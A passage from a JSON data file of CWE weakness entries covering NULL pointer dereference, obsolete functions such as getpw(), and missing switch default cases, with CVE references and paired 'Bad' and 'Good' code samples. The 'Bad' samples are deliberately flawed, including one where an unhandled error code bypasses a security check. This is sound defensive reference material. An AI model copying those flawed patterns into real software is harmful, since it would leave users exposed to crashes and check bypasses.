MyReceiver();\n\tregisterReceiver(receiver, filter);\n\t\n\t *...* \n\t\n\tpublic class UrlHandlerReceiver extends BroadcastReceiver {\n\t```\n\t\t\t@Override\n\t\t\tpublic void onReceive(Context context, Intent intent) {\n\t\t\t\t\tif(\"com.example.URLHandler.openURL\".equals(intent.getAction())) {\n\t\t\t\t\t\tString URL = intent.getStringExtra(\"URLToOpen\");\n\t\t\t\t\t\tint length = URL.length();\n```\n...* \n\t\t\t\t\t}}}"}, {"BodyText": "The application assumes the URL will always be included in the intent. When the URL is not present, the call to getStringExtra() will return null, thus causing a null pointer exception when length() is called."}]}, {"Entries": [{"IntroText": "Consider the following example of a typical client server exchange. The HandleRequest function is intended to perform a request and use a defer to close the connection whenever the function returns."}, {"Nature": "Bad", "Language": "Go", "ExampleCode": "```\n\tfunc HandleRequest(client http.Client, request *http.Request) (*http.Response, error) { \n\t\t response, err := client.Do(request)\n\t\t defer response.Body.Close()\n\t\t if err != nil { \n\t\t\t return nil, err\n\t\t }\n\t\t...\n\t }\n```"}, {"BodyText": "If a user supplies a malformed request or violates the client policy, the Do method can return a nil response and a non-nil err."}, {"BodyText": "This HandleRequest Function evaluates the close before checking the error. A deferred call's arguments are evaluated immediately, so the defer statement panics due to a nil response."}]}], "ObservedExamples": [{"Reference": "CVE-2005-3274", "Description": "race condition causes a table to be corrupted if a timer activates while it is being modified, leading to resultant NULL dereference; also involves locking.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-3274"}, {"Reference": "CVE-2002-1912", "Description": "large number of packets leads to NULL dereference", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1912"}, {"Reference": "CVE-2005-0772", "Description": "packet with invalid error status value triggers NULL dereference", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-0772"}, {"Reference": "CVE-2009-4895", "Description": "Chain: race condition for an argument value, possibly resulting in NULL dereference", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-4895"}, {"Reference": "CVE-2020-29652", "Description": "ssh component for Go allows clients to cause a denial of service (nil pointer dereference) against SSH servers.", "Link": "https://www.cve.org/CVERecord?id=CVE-2020-29652"}, {"Reference": "CVE-2009-2692", "Description": "Chain: Use of an unimplemented network socket operation pointing to an uninitialized handler function (CWE-456) causes a crash because of a null pointer dereference (CWE-476).", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2692"}, {"Reference": "CVE-2009-3547", "Description": "Chain: race condition (CWE-362) might allow resource to be released before operating on it, leading to NULL dereference (CWE-476)", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3547"}, {"Reference": "CVE-2009-3620", "Description": "Chain: some unprivileged ioctls do not verify that a structure has been initialized before invocation, leading to NULL dereference", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3620"}, {"Reference": "CVE-2009-2698", "Description": "Chain: IP and UDP layers each track the same value with different mechanisms that can get out of sync, possibly resulting in a NULL dereference", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2698"}, {"Reference": "CVE-2009-2692", "Description": "Chain: uninitialized function pointers can be dereferenced allowing code execution", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2692"}, {"Reference": "CVE-2009-0949", "Description": "Chain: improper initialization of memory can lead to NULL dereference", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0949"}, {"Reference": "CVE-2008-3597", "Description": "Chain: game server can access player data structures before initialization has happened leading to NULL dereference", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3597"}, {"Reference": "CVE-2020-6078", "Description": "Chain: The return value of a function returning a pointer is not checked for success (CWE-252) resulting in the later use of an uninitialized variable (CWE-456) and a null pointer dereference (CWE-476)", "Link": "https://www.cve.org/CVERecord?id=CVE-2020-6078"}, {"Reference": "CVE-2008-0062", "Description": "Chain: a message having an unknown message type may cause a reference to uninitialized memory resulting in a null pointer dereference (CWE-476) or dangling pointer (CWE-825), possibly crashing the system or causing heap corruption.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-0062"}, {"Reference": "CVE-2008-5183", "Description": "Chain: unchecked return value can lead to NULL dereference", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-5183"}, {"Reference": "CVE-2004-0079", "Description": "SSL software allows remote attackers to cause a denial of service (crash) via a crafted SSL/TLS handshake that triggers a null dereference.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0079"}, {"Reference": "CVE-2004-0365", "Description": "Network monitor allows remote attackers to cause a denial of service (crash) via a malformed RADIUS packet that triggers a null dereference.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0365"}, {"Reference": "CVE-2003-1013", "Description": "Network monitor allows remote attackers to cause a denial of service (crash) via a malformed Q.931, which triggers a null dereference.", "Link": "https://www.cve.org/CVERecord?id=CVE-2003-1013"}, {"Reference": "CVE-2003-1000", "Description": "Chat client allows remote attackers to cause a denial of service (crash) via a passive DCC request with an invalid ID number, which causes a null dereference.", "Link": "https://www.cve.org/CVERecord?id=CVE-2003-1000"}, {"Reference": "CVE-2004-0389", "Description": "Server allows remote attackers to cause a denial of service (crash) via malformed requests that trigger a null dereference.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0389"}, {"Reference": "CVE-2004-0119", "Description": "OS allows remote attackers to cause a denial of service (crash from null dereference) or execute arbitrary code via a crafted request during authentication protocol selection.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0119"}, {"Reference": "CVE-2004-0458", "Description": "Game allows remote attackers to cause a denial of service (server crash) via a missing argument, which triggers a null pointer dereference.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0458"}, {"Reference": "CVE-2002-0401", "Description": "Network monitor allows remote attackers to cause a denial of service (crash) or execute arbitrary code via malformed packets that cause a NULL pointer dereference.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-0401"}, {"Reference": "CVE-2001-1559", "Description": "Chain: System call returns wrong value (CWE-393), leading to a resultant NULL dereference (CWE-476).", "Link": "https://www.cve.org/CVERecord?id=CVE-2001-1559"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2021-29568", "Description": "TensorFlow is an end-to-end open source platform for machine learning. An attacker can trigger undefined behavior by binding to null pointer in `tf.raw_ops.ParameterizedTruncatedNormal`. This is because the implementation(https://github.com/tensorflow/tensorflow/blob/3f6fe4dfef6f57e768260b48166c27d148f3015f/tensorflow/core/kernels/parameterized_truncated_normal_op.cc#L630) does not validate input arguments before accessing the first element of `shape`. If `shape` argument is empty, then `shape_tensor.flat<T>()` is an empty array. The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range."}, {"Reference": "CVE-2021-36613", "Description": "Mikrotik RouterOs before stable 6.48.2 suffers from a memory corruption vulnerability in the ptp process. An authenticated remote attacker can cause a Denial of Service (NULL pointer dereference)."}, {"Reference": "CVE-2021-36614", "Description": "Mikrotik RouterOs before stable 6.48.2 suffers from a memory corruption vulnerability in the tr069-client process. An authenticated remote attacker can cause a Denial of Service (NULL pointer dereference)."}, {"Reference": "CVE-2022-1516", "Description": "A NULL pointer dereference flaw was found in the Linux kernel\u2019s X.25 set of standardized network protocols functionality in the way a user terminates their session using a simulated Ethernet card and continued usage of this connection. This flaw allows a local user to crash the system."}, {"Reference": "CVE-2022-1649", "Description": "Null pointer dereference in libr/bin/format/mach0/mach0.c in radareorg/radare2 in GitHub repository radareorg/radare2 prior to 5.7.0. It is likely to be exploitable. For more general description of heap buffer overflow, see [CWE](https://cwe.mitre.org/data/definitions/476.html)."}, {"Reference": "CVE-2022-23035", "Description": "Insufficient cleanup of passed-through device IRQs The management of IRQs associated with physical devices exposed to x86 HVM guests involves an iterative operation in particular when cleaning up after the guest's use of the device. In the case where an interrupt is not quiescent yet at the time this cleanup gets invoked, the cleanup attempt may be scheduled to be retried. When multiple interrupts are involved, this scheduling of a retry may get erroneously skipped. At the same time pointers may get cleared (resulting in a de-reference of NULL) and freed (resulting in a use-after-free), while other code would continue to assume them to be valid."}, {"Reference": "CVE-2022-25258", "Description": "An issue was discovered in drivers/usb/gadget/composite.c in the Linux kernel before 5.16.10. The USB Gadget subsystem lacks certain validation of interface OS descriptor requests (ones with a large array index and ones associated with NULL function pointer retrieval). Memory corruption might occur."}, {"Reference": "CVE-2022-26093", "Description": "Null pointer dereference vulnerability in parser_irot function in libsimba library prior to SMR Apr-2022 Release 1 allows out of bounds write by remote attacker."}, {"Reference": "CVE-2022-26094", "Description": "Null pointer dereference vulnerability in parser_auxC function in libsimba library prior to SMR Apr-2022 Release 1 allows out of bounds write by remote attacker."}, {"Reference": "CVE-2022-26095", "Description": "Null pointer dereference vulnerability in parser_colr function in libsimba library prior to SMR Apr-2022 Release 1 allows out of bounds write by remote attacker."}, {"Reference": "CVE-2022-26096", "Description": "Null pointer dereference vulnerability in parser_ispe function in libsimba library prior to SMR Apr-2022 Release 1 allows out of bounds write by remote attacker."}, {"Reference": "CVE-2022-26097", "Description": "Null pointer dereference vulnerability in parser_unknown_property function in libsimba library prior to SMR Apr-2022 Release 1 allows out of bounds write by remote attacker."}, {"Reference": "CVE-2022-26099", "Description": "Null pointer dereference vulnerability in parser_infe function of libsimba library prior to SMR Apr-2022 Release 1 allows out of bounds read by remote attackers."}, {"Reference": "CVE-2022-27567", "Description": "Null pointer dereference vulnerability in parser_hvcC function of libsimba library prior to SMR Apr-2022 Release 1 allows out of bounds write by remote attackers."}, {"Reference": "CVE-2022-31748", "Description": "Mozilla developers Gabriele Svelto, Timothy Nikkel, Randell Jesup, Jon Coppeard, and the Mozilla Fuzzing Team reported memory safety bugs present in Firefox 100. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code. This vulnerability affects Firefox < 101."}, {"Reference": "CVE-2022-41595", "Description": "The phones have the heap overflow, out-of-bounds read, and null pointer vulnerabilities in the fingerprint trusted application (TA).Successful exploitation of this vulnerability may affect the fingerprint service."}, {"Reference": "CVE-2022-41858", "Description": "A flaw was found in the Linux kernel. A NULL pointer dereference may occur while a slip driver is in progress to detach in sl_tx_timeout in drivers/net/slip/slip.c. This issue could allow an attacker to crash the system or leak internal kernel information."}, {"Reference": "CVE-2022-42928", "Description": "Certain types of allocations were missing annotations that, if the Garbage Collector was in a specific state, could have lead to memory corruption and a potentially exploitable crash. This vulnerability affects Firefox < 106, Firefox ESR < 102.4, and Thunderbird < 102.4."}, {"Reference": "CVE-2021-33456", "Description": "An issue was discovered in yasm version 1.3.0. There is a NULL pointer dereference in hash() in modules/preprocs/nasm/nasm-pp.c."}, {"Reference": "CVE-2021-38567", "Description": "An issue was discovered in Foxit PDF Editor before 11.0.1 and PDF Reader before 11.0.1 on macOS. It mishandles missing dictionary entries, leading to a NULL pointer dereference, aka CNVD-C-2021-95204."}, {"Reference": "CVE-2021-4209", "Description": "A NULL pointer dereference flaw was found in GnuTLS. As Nettle's hash update functions internally call memcpy, providing zero-length input may cause undefined behavior. This flaw leads to a denial of service after authentication in rare circumstances."}, {"Reference": "CVE-2021-4236", "Description": "Web Sockets do not execute any AuthenticateMethod methods which may be set, leading to a nil pointer dereference if the returned UserData pointer is assumed to be non-nil, or authentication bypass. This issue only affects WebSockets with an AuthenticateMethod hook. Request handlers that do not explicitly use WebSockets are not vulnerable."}, {"Reference": "CVE-2022-2832", "Description": "A flaw was found in Blender 3.3.0. A null pointer dereference exists in source/blender/gpu/opengl/gl_backend.cc that may lead to loss of confidentiality and integrity."}, {"Reference": "CVE-2022-47359", "Description": "In log service, there is a missing permission check. This could lead to local denial of service in log service."}, {"Reference": "CVE-2022-47360", "Description": "In log service, there is a missing permission check. This could lead to local denial of service in log service."}, {"Reference": "CVE-2021-34405", "Description": "NVIDIA Linux distributions contain a vulnerability in TrustZone\u2019s TEE_Malloc function, where an unchecked return value causing a null pointer dereference may lead to denial of service."}, {"Reference": "CVE-2022-0907", "Description": "Unchecked Return Value to NULL Pointer Dereference in tiffcrop in libtiff 4.3.0 allows attackers to cause a denial-of-service via a crafted tiff file. For users that compile libtiff from sources, the fix is available with commit f2b656e2."}, {"Reference": "CVE-2022-22231", "Description": "An Unchecked Return Value to NULL Pointer Dereference vulnerability in Packet Forwarding Engine (PFE) of Juniper Networks Junos OS allows an unauthenticated, network-based attacker to cause a Denial of Service (DoS). On SRX Series if Unified Threat Management (UTM) Enhanced Content Filtering (CF) and AntiVirus (AV) are enabled together and the system processes specific valid transit traffic the Packet Forwarding Engine (PFE) will crash and restart. This issue affects Juniper Networks Junos OS 21.4 versions prior to 21.4R1-S2, 21.4R2 on SRX Series. This issue does not affect Juniper Networks Junos OS versions prior to 21.4R1."}, {"Reference": "CVE-2022-22233", "Description": "An Unchecked Return Value to NULL Pointer Dereference vulnerability in Routing Protocol Daemon (rpd) of Juniper Networks Junos OS and Junos OS Evolved allows a locally authenticated attacker with low privileges to cause a Denial of Service (DoS). In Segment Routing (SR) to Label Distribution Protocol (LDP) interworking scenario, configured with Segment Routing Mapping Server (SRMS) at any node, when an Area Border Router (ABR) leaks the SRMS entries having \"S\" flag set from IS-IS Level 2 to Level 1, an rpd core might be observed when a specific low privileged CLI command is issued. This issue affects: Juniper Networks Junos OS 21.4 versions prior to 21.4R1-S2, 21.4R2-S1, 21.4R3; 22.1 versions prior to 22.1R2. Juniper Networks Junos OS Evolved 21.4-EVO versions prior to 21.4R1-S2-EVO, 21.4R2-S1-EVO, 21.4R3-EVO; 22.1-EVO versions prior to 22.1R2-EVO. This issue does not affect: Juniper Networks Junos OS versions prior to 21.4R1. Juniper Networks Junos OS Evolved versions prior to 21.4R1-EVO."}, {"Reference": "CVE-2022-0582", "Description": "Unaligned access in the CSN.1 protocol dissector in Wireshark 3.6.0 to 3.6.1 and 3.4.0 to 3.4.11 allows denial of service via packet injection or crafted capture file"}, {"Reference": "CVE-2022-20796", "Description": "On May 4, 2022, the following vulnerability in the ClamAV scanning library versions 0.103.5 and earlier and 0.104.2 and earlier was disclosed: A vulnerability in Clam AntiVirus (ClamAV) versions 0.103.4, 0.103.5, 0.104.1, and 0.104.2 could allow an authenticated, local attacker to cause a denial of service condition on an affected device. For a description of this vulnerability, see the ClamAV blog."}, {"Reference": "CVE-2022-25310", "Description": "A segmentation fault (SEGV) flaw was found in the Fribidi package and affects the fribidi_remove_bidi_marks() function of the lib/fribidi.c file. This flaw allows an attacker to pass a specially crafted file to Fribidi, leading to a crash and causing a denial of service."}, {"Reference": "CVE-2022-35108", "Description": "SWFTools commit 772e55a2 was discovered to contain a segmentation violation via DCTStream::getChar() at /xpdf/Stream.cc."}, {"Reference": "CVE-2022-35484", "Description": "OTFCC v0.10.4 was discovered to contain a segmentation violation via /release-x64/otfccdump+0x6b6a8f."}, {"Reference": "CVE-2022-36151", "Description": "tifig v0.2.2 was discovered to contain a segmentation violation via getType() at /common/bbox.cpp."}, {"Reference": "CVE-2022-36153", "Description": "tifig v0.2.2 was discovered to contain a segmentation violation via std::vector<unsigned int, std::allocator<unsigned int> >::size() const at /bits/stl_vector.h."}, {"Reference": "CVE-2022-41909", "Description": "TensorFlow is an open source platform for machine learning. An input `encoded` that is not a valid `CompositeTensorVariant` tensor will trigger a segfault in `tf.raw_ops.CompositeTensorVariantToComponents`. We have patched the issue in GitHub commits bf594d08d377dc6a3354d9fdb494b32d45f91971 and 660ce5a89eb6766834bdc303d2ab3902aef99d3d. The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range."}, {"Reference": "CVE-2022-3807", "Description": "A vulnerability was found in Axiomatic Bento4. It has been rated as problematic. Affected by this issue is some unknown functionality of the component Incomplete Fix CVE-2019-13238. The manipulation leads to resource consumption. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-212660."}, {"Reference": "CVE-2022-38307", "Description": "LIEF commit 5d1d643 was discovered to contain a segmentation violation via the function LIEF::MachO::SegmentCommand::file_offset() at /MachO/SegmentCommand.cpp."}, {"Reference": "CVE-2022-38497", "Description": "LIEF commit 365a16a was discovered to contain a segmentation violation via the component CoreFile.tcc:69."}, {"Reference": "CVE-2022-35087", "Description": "SWFTools commit 772e55a2 was discovered to contain a segmentation violation via MovieAddFrame at /src/gif2swf.c."}, {"Reference": "CVE-2022-29206", "Description": "TensorFlow is an open source platform for machine learning. Prior to versions 2.9.0, 2.8.1, 2.7.2, and 2.6.4, the implementation of `tf.raw_ops.SparseTensorDenseAdd` does not fully validate the input arguments. In this case, a reference gets bound to a `nullptr` during kernel execution. This is undefined behavior. Versions 2.9.0, 2.8.1, 2.7.2, and 2.6.4 contain a patch for this issue."}, {"Reference": "CVE-2022-29201", "Description": "TensorFlow is an open source platform for machine learning. Prior to versions 2.9.0, 2.8.1, 2.7.2, and 2.6.4, the implementation of `tf.raw_ops.QuantizedConv2D` does not fully validate the input arguments. In this case, references get bound to `nullptr` for each argument that is empty. Versions 2.9.0, 2.8.1, 2.7.2, and 2.6.4 contain a patch for this issue."}]}
{"ID": "477", "Name": "Use of Obsolete Function", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The code uses deprecated or obsolete functions, which suggests that the code has not been actively reviewed or maintained.", "ExtendedDescription": "\n\nAs programming languages evolve, functions occasionally become obsolete due to:\n\n\n  - Advances in the language\n\n  - Improved understanding of how operations should be performed effectively and securely\n\n  - Changes in the conventions that govern certain operations\n\nFunctions that are removed are usually replaced by newer counterparts that perform the same task in some different and hopefully improved way.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "710", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Quality Degradation"]}], "DetectionMethods": [{"Method": "Automated Static Analysis - Binary or Bytecode", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tBinary / Bytecode Quality Analysis\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tBytecode Weakness Analysis - including disassembler + source code weakness analysis", "Effectiveness": "High"}, {"Method": "Manual Static Analysis - Binary or Bytecode", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tBinary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies", "Effectiveness": "SOAR Partial"}, {"Method": "Dynamic Analysis with Manual Results Interpretation", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tDebugger", "Effectiveness": "High"}, {"Method": "Manual Static Analysis - Source Code", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tManual Source Code Review (not inspections)\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tFocused Manual Spotcheck - Focused manual analysis of source", "Effectiveness": "High"}, {"Method": "Automated Static Analysis - Source Code", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tSource Code Quality Analyzer\n\t\tSource code Weakness Analyzer\n\t\tContext-configured Source Code Weakness Analyzer", "Effectiveness": "High"}, {"Method": "Automated Static Analysis", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tOrigin Analysis", "Effectiveness": "High"}, {"Method": "Architecture or Design Review", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tFormal Methods / Correct-By-Construction\n\t\tInspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Refer to the documentation for the obsolete function in order to determine why it is deprecated or obsolete and to learn about alternative ways to achieve the same functionality."}, {"Phase": ["Requirements"], "Description": "Consider seriously the security implications of using an obsolete function. Consider using alternate functions."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "The following code uses the deprecated function getpw() to verify that a plaintext password matches a user's encrypted password. If the password is valid, the function sets result to 1; otherwise it is set to 0."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\t...\n\tgetpw(uid, pwdline);\n\tfor (i=0; i<3; i++){\n\t\tcryptpw=strtok(pwdline, \":\");\n\t\tpwdline=0;\n\t}\n\tresult = strcmp(crypt(plainpw,cryptpw), cryptpw) == 0;\n\t...\n```"}, {"BodyText": "Although the code often behaves correctly, using the getpw() function can be problematic from a security standpoint, because it can overflow the buffer passed to its second parameter. Because of this vulnerability, getpw() has been supplanted by getpwuid(), which performs the same lookup as getpw() but returns a pointer to a statically-allocated structure to mitigate the risk. Not all functions are deprecated or replaced because they pose a security risk. However, the presence of an obsolete function often indicates that the surrounding code has been neglected and may be in a state of disrepair. Software security has not been a priority, or even a consideration, for very long. If the program uses deprecated or obsolete functions, it raises the probability that there are security problems lurking nearby."}]}, {"Entries": [{"IntroText": "In the following code, the programmer assumes that the system always has a property named \"cmd\" defined. If an attacker can control the program's environment so that \"cmd\" is not defined, the program throws a null pointer exception when it attempts to call the \"Trim()\" method."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tString cmd = null;\n\t...\n\tcmd = Environment.GetEnvironmentVariable(\"cmd\");\n\tcmd = cmd.Trim();\n```"}]}, {"Entries": [{"IntroText": "The following code constructs a string object from an array of bytes and a value that specifies the top 8 bits of each 16-bit Unicode character."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\t...\n\tString name = new String(nameBytes, highByte);\n\t...\n```"}, {"BodyText": "In this example, the constructor may not correctly convert bytes to characters depending upon which charset is used to encode the string represented by nameBytes. Due to the evolution of the charsets used to encode strings, this constructor was deprecated and replaced by a constructor that accepts as one of its parameters the name of the charset used to encode the bytes for conversion."}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "478", "Name": "Missing Default Case in Multiple Condition Expression", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The code does not have a default case in an expression with multiple conditions, such as a switch statement.", "ExtendedDescription": "If a multiple-condition expression (such as a switch in C) omits the default case but does not consider or handle all possible values that could occur, then this might lead to complex logical errors and resultant weaknesses. Because of this, further decisions are made based on poor information, and cascading failure results. This cascading failure may result in any number of security issues, and constitutes a significant failure in the system.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1023", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "C", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "C++", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "C#", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "Python", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "JavaScript", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Integrity"], "Impact": ["Varies by Context", "Alter Execution Logic"], "Note": "Depending on the logical circumstances involved, any consequences may result: e.g., issues of confidentiality, authentication, authorization, availability, integrity, accountability, or non-repudiation."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Ensure that there are no cases unaccounted for when adjusting program flow or values based on the value of a given variable. In the case of switch style statements, the very simple act of creating a default case can, if done correctly, mitigate this situation. Often however, the default case is used simply to represent an assumed option, as opposed to working as a check for invalid input. This is poor practice and in some cases is as bad as omitting a default case entirely."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "The following does not properly check the return code in the case where the security_check function returns a -1 value when an error occurs. If an attacker can supply data that will invoke an error, the attacker can bypass the security check:"}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\t#define FAILED 0\n\t#define PASSED 1\n\tint result;\n\t...\n\tresult = security_check(data);\n\tswitch (result) {\n\t\t\tcase FAILED:\n\t\t\t\tprintf(\"Security check failed!\\n\");\n\t\t\t\texit(-1);\n```\n//Break never reached because of exit()* \n\t\t\t\tbreak;\n\t\t\tcase PASSED:\n\t\t\t```\n\t\t\t\tprintf(\"Security check passed.\\n\");\n\t\t\t\tbreak;\n\t}\n```\n// program execution continues...* \n\t..."}, {"BodyText": "Instead a default label should be used for unaccounted conditions:"}, {"Nature": "Good", "Language": "C", "ExampleCode": "```\n\t#define FAILED 0\n\t#define PASSED 1\n\tint result;\n\t...\n\tresult = security_check(data);\n\tswitch (result) {\n\t\t\tcase FAILED:\n\t\t\t\tprintf(\"Security check failed!\\n\");\n\t\t\t\texit(-1);\n```\n//Break never reached because of exit()* \n\t\t\t\tbreak;\n\t\t\tcase PASSED:\n\t\t\t```\n\t\t\t\tprintf(\"Security check passed.\\n\");\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tprintf(\"Unknown error (%d), exiting...\\n\",result);\n\t\t\t\texit(-1);\n\t}\n```"}, {"BodyText": "This label is used because the assumption cannot be made that all possible cases are accounted for. A good practice is to reserve the default case for error handling."}]}, {"Entries": [{"IntroText": "In the following Java example the method getInterestRate retrieves the interest rate for the number of points for a mortgage. The number of points is provided within the input parameter and a switch statement will set the interest rate value to be returned based on the number of points."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic static final String INTEREST_RATE_AT_ZERO_POINTS = \"5.00\";\n\tpublic static final String INTEREST_RATE_AT_ONE_POINTS = \"4.75\";\n\tpublic static final String INTEREST_RATE_AT_TWO_POINTS = \"4.50\";\n\t...\n\tpublic BigDecimal getInterestRate(int points) {\n\t\t\tBigDecimal result = new BigDecimal(INTEREST_RATE_AT_ZERO_POINTS);\n\t\t\tswitch (points) {\n\t\t\t\t\tcase 0:\n\t\t\t\t\t\tresult = new BigDecimal(INTEREST_RATE_AT_ZERO_POINTS);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase 1:\n\t\t\t\t\t\tresult = new BigDecimal(INTEREST_RATE_AT_ONE_POINTS);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase 2:\n\t\t\t\t\t\tresult = new BigDecimal(INTEREST_RATE_AT_TWO_POINTS);\n\t\t\t\t\t\tbreak;\n\t\t\t}\n\t\t\treturn result;\n\t}\n```"}, {"BodyText": "However, this code assumes that the value of the points input parameter will always be 0, 1 or 2 and does not check for other incorrect values passed to the method. This can be easily accomplished by providing a default label in the switch statement that outputs an error message indicating an invalid value for the points input parameter and returning a null value."}, {"Nature": "Good", "Language": "Java", "ExampleCode": "```\n\tpublic static final String INTEREST_RATE_AT_ZERO_POINTS = \"5.00\";\n\tpublic static final String INTEREST_RATE_AT_ONE_POINTS = \"4.75\";\n\tpublic static final String INTEREST_RATE_AT_TWO_POINTS = \"4.50\";\n\t...\n\tpublic BigDecimal getInterestRate(int points) {\n\t\t\tBigDecimal result = new BigDecimal(INTEREST_RATE_AT_ZERO_POINTS);\n\t\t\tswitch (points) {\n\t\t\t\t\tcase 0:\n\t\t\t\t\t\tresult = new BigDecimal(INTEREST_RATE_AT_ZERO_POINTS);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase 1:\n\t\t\t\t\t\tresult = new BigDecimal(INTEREST_RATE_AT_ONE_POINTS);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase 2:\n\t\t\t\t\t\tresult = new BigDecimal(INTEREST_RATE_AT_TWO_POINTS);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tdefault:\n\t\t\t\t\t\tSystem.err.println(\"Invalid value for points, must be 0, 1 or 2\");\n\t\t\t\t\t\tSystem.err.println(\"Returning null value for interest rate\");\n\t\t\t\t\t\tresult = null;\n\t\t\t}\n\t\t\treturn result;\n\t}\n```"}]}, {"Entries": [{"IntroText": "In the following Python example the match-case statements (available in Python version 3.10 and later) perform actions based on the result of the process_data() function. The expected return is either 0 or 1. However, if an unexpected result (e.g., -1 or 2) is obtained then no actions will be taken potentially leading to an unexpected program state."}, {"Nature": "Bad", "Language": "Python", "ExampleCode": "```\n\tresult = process_data(data) \n\tmatch result: \n\t\tcase 0: \n\t\t\tprint(\"Properly handle zero case.\")\n\t\tcase 1: \n\t\t\tprint(\"Properly handle one case.\")\n\t# program execution continues...\n```"}, {"BodyText": "The recommended approach is to add a default case that captures any unexpected result conditions, regardless of how improbable these unexpected conditions might be, and properly handles them."}, {"Nature": "Good", "Language": "Python", "ExampleCode": "```\n\tresult = process_data(data) \n\tmatch result: \n\t\tcase 0: 